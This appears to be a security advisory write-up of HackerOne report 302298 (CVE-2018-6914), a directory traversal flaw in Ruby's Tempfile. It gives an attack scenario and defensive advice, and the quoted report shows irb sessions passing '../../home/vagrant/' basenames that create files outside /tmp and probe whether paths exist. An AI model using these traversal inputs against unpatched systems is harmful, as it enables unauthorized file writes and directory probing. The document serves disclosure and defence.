# Unintentional file creation caused at Tempfile with directory traversal

## Metadata
- **Source:** HackerOne
- **Report:** 302298 | https://hackerone.com/reports/302298
- **Submitted:** 2018-01-04
- **Reporter:** ooooooo_q
- **Program:** Ruby
- **Bounty:** Not specified
- **Severity:** medium
- **Vuln:** Directory Traversal, Path Traversal, Insecure Temporary File Creation
- **CVEs:** CVE-2018-6914
- **Category:** uncategorised

## Summary
Ruby's Tempfile class fails to properly validate and sanitize the basename argument, allowing directory traversal sequences (../) to escape the intended temporary directory. An attacker can craft malicious basename arguments to create temporary files in arbitrary locations outside /tmp, potentially enabling arbitrary file creation or information disclosure.

## Attack scenario
1. Attacker identifies an application using Ruby's Tempfile with user-controlled basename arguments
2. Attacker crafts a basename parameter containing directory traversal sequences like '../../home/user/target'
3. Attacker invokes the vulnerable Tempfile.open(), Tempfile.new(), or Tempfile.create() method with the malicious basename
4. Tempfile processes the basename without proper validation and creates a file outside the intended /tmp directory
5. Attacker can write arbitrary content to the file or confirm file/directory existence through error messages
6. Attacker leverages the created file for privilege escalation, configuration overwriting, or information disclosure

## Root cause
Tempfile does not sanitize or validate the basename parameter before constructing the full file path. The basename is concatenated with the temporary directory path without stripping path traversal sequences, allowing relative paths to escape the sandbox directory.

## Attacker mindset
An attacker exploiting this would seek to escape temporary file isolation to write files in sensitive locations (e.g., /home/user, /etc), overwrite configuration files, plant malicious code, or probe for file existence to leak information about the target system's directory structure.

## Defensive takeaways
- Validate and sanitize all user-controlled input passed to file creation functions, especially basename parameters
- Use basename() or File.basename() to strip directory components from user input before passing to Tempfile
- Reject any basename containing path traversal sequences (../, .\, null bytes)
- Use a whitelist of allowed characters for temporary file names rather than blacklisting dangerous ones
- Ensure Tempfile operations remain confined to the intended temporary directory by validating resolved paths
- Apply principle of least privilege to the process creating temporary files to limit damage from exploitation
- Use parameterized/safe APIs that don't interpret path traversal sequences in filenames

## Variant hunting
Search for similar path traversal issues in other Ruby standard library file operations (File.open, Dir.glob, Dir.mkdir). Check if other languages' tempfile libraries (Python's tempfile, C's mkstemp) have similar issues or if they properly sanitize input. Look for applications passing unsanitized user input to any Tempfile method.

## MITRE ATT&CK
- T1190
- T1083
- T1566

## Notes
This vulnerability demonstrates that even standard library functions can have security flaws when they don't properly validate input. The error messages leak directory existence information, providing an oracle for directory enumeration. The issue affects multiple Tempfile creation methods (open, new, create), indicating a systemic problem in the library's design rather than a single method.

## Full report
<details><summary>Expand</summary>

The Tempfile argument of `basename` can use `../` without escaping.
Therefore, directory traversal may occur and unintended files may be generated.


#### create file patern

```log
[vagrant@localhost ~]$ ls .
[vagrant@localhost ~]$ irb
irb(main):001:0> require 'tempfile'
=> true

irb(main):002:0> Tempfile.open(['../../home/vagrant/', '.red'])
=> #<Tempfile:/tmp/../../home/vagrant/20180103-4697-uwqiop.red>
irb(main):003:0> `ls`
=> "20180103-4697-uwqiop.red\n"

irb(main):004:0> Tempfile.new("/../../home/vagrant/green")
=> #<Tempfile:/tmp/../../home/vagrant/green20180103-4697-1wbl81o>
irb(main):005:0> `ls`
=> "20180103-4697-uwqiop.red\ngreen20180103-4697-1wbl81o\n"

irb(main):006:0> Tempfile.create("/../../home/vagrant/blue") {|f| p f.path}
"/tmp/../../home/vagrant/blue20180103-4697-1udvlji"
=> "/tmp/../../home/vagrant/blue20180103-4697-1udvlji"

# It can not be created because suffix specifies a directory that does not exist.
irb(main):007:0> Tempfile.open(['hoge', '/../../home/vagrant/bar'])
Traceback (most recent call last):
        9: from /home/vagrant/.rbenv/versions/2.5.0/bin/irb:11:in `<main>'
        8: from (irb):7
        7: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:291:in `open'
        6: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:291:in `new'
        5: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:131:in `initialize'
        4: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tmpdir.rb:126:in `create'
        3: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `block in initialize'
        2: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `open'
        1: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `initialize'
Errno::ENOENT (No such file or directory @ rb_sysopen - /tmp/hoge20180103-4697-utss0s/../../home/vagrant/bar)
```

#### If the file exists

```log
[vagrant@localhost ~]$ ls
test
[vagrant@localhost ~]$ irb
irb(main):001:0> require 'tempfile'
=> true
irb(main):002:0> Tempfile.new("/../../home/vagrant/test/xxx")
Traceback (most recent call last):
        8: from /home/vagrant/.rbenv/versions/2.5.0/bin/irb:11:in `<main>'
        7: from (irb):2
        6: from (irb):2:in `new'
        5: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:131:in `initialize'
        4: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tmpdir.rb:126:in `create'
        3: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `block in initialize'
        2: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `open'
        1: from /home/vagrant/.rbenv/versions/2.5.0/lib/ruby/2.5.0/tempfile.rb:133:in `initialize'
Errno::ENOTDIR (Not a directory @ rb_sysopen - /tmp/../../home/vagrant/test/xxx20180103-4783-1f4l2ox)
```

## Impact

An unintended file may be generated in places other than the assumed directory.
It is possible to confirm the existence of the file by using the occurrence or not a directory error.

</details>

---
*Analysed by Claude on 2026-05-24*
